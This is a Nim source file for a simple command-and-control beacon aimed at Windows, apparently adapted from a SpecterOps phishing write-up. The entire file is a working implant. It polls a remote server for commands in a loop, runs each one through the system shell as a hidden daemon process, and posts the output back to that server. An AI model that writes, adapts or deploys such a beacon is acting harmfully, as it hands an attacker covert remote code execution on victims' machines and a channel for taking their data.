# Strictly for Windows
# 1. ./c2beacon
# 2. python3 server.py

# Source: https://posts.specterops.io/deep-sea-phishing-pt-1-092a0637e2fd

import httpclient
import std/os
import osproc

var server = "http://server/command.txt"

proc getTask(): string =
    var client = newHttpClient()
    var command = client.getContent(server)
    client.close()
    return command


proc taskIO(data: string): string =
    var client = newHttpClient()
    client.headers = newHttpHeaders({"Content-Type": "text/plain"})
    try:
        discard client.postContent(server, data)
        echo "done"
    finally:
        client.close()

while true:
    let newTask: string = getTask()
    if newTask.len > 0:

        # https://nim-lang.org/docs/osproc.html#ProcessOption
        let result: string = execProcess(newTask , options={poUsePath, poStdErrToStdOut, poEvalCommand, poDaemon})

        discard taskIO(result)
    sleep(10000)